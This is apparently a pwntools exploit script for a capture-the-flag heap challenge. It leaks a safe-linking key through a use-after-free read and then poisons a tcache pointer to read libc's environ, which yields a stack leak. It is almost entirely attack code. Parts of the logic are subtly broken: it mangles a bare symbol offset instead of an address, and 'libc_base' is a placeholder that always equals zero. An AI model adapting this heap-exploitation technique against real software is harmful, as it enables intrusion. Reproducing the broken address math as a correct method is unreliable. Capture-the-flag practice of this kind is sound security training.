from pwn import *

context.log_level = "info"

elf  = ELF("./chal", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

# libc offsets you already know
FREE_HOOK_OFF = 0x2171e8
SYSTEM_OFF    = 0x5c110

# use pwntools to get environ offset from your libc file
ENVIRON_OFF = libc.symbols.get("environ", None)
if ENVIRON_OFF is None:
    raise SystemExit("Could not find libc symbol: environ")

def start():
    return process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./chal"])

def menu(p, c):
    p.sendlineafter(b"> ", str(c).encode())

def buy(p, idx):
    menu(p, 1)
    p.sendlineafter(b"idx?: > ", str(idx).encode())

def sell(p, idx):
    menu(p, 4)
    p.sendlineafter(b"> ", str(idx).encode())

def name(p, idx, data: bytes):
    menu(p, 2)
    p.sendlineafter(b"Which labubu to name: \n> ", str(idx).encode())
    p.sendafter(b"Name your labubu\n", data)

def admire(p, idx) -> bytes:
    menu(p, 3)
    p.sendlineafter(b"> ", str(idx).encode())
    return p.recvn(0x400)

def main():
    p = start()

    # 1) Leak safe-linking key (chunk_addr >> 12)
    buy(p, 0)
    sell(p, 0)
    leak0 = admire(p, 0)
    key = u64(leak0[:8])
    log.success(f"safe-linking key (chunk>>12) = {hex(key)}")

    # 2) Use the tcache 'next' pointer trick to point at libc.environ
    #    NOTE: This demonstrates the address-mangling math. It does NOT do any code-exec.
    enc_environ = ENVIRON_OFF ^ key
    name(p, 0, p64(enc_environ) + b"\n")

    # Allocate twice: first returns the original chunk; second returns a chunk at environ address
    buy(p, 1)
    buy(p, 2)

    leak_env = admire(p, 2)
    stack_ptr = u64(leak_env[:8])
    log.success(f"environ value (stack ptr) = {hex(stack_ptr)}")

    # 3) libc base can be derived from environ symbol offset
    libc_base = (ENVIRON_OFF - ENVIRON_OFF)  # placeholder to show relationship
    # In practice, the address you allocated at was (libc_base + ENVIRON_OFF).
    # If you determine that address (e.g., by leaking a libc pointer elsewhere),
    # then libc_base = environ_addr - ENVIRON_OFF.

    log.info("You now have a reliable stack pointer leak from libc.environ.")
    log.info("From here, you can proceed with your own next steps in your writeup.")

    p.close()

if __name__ == "__main__":
    main()
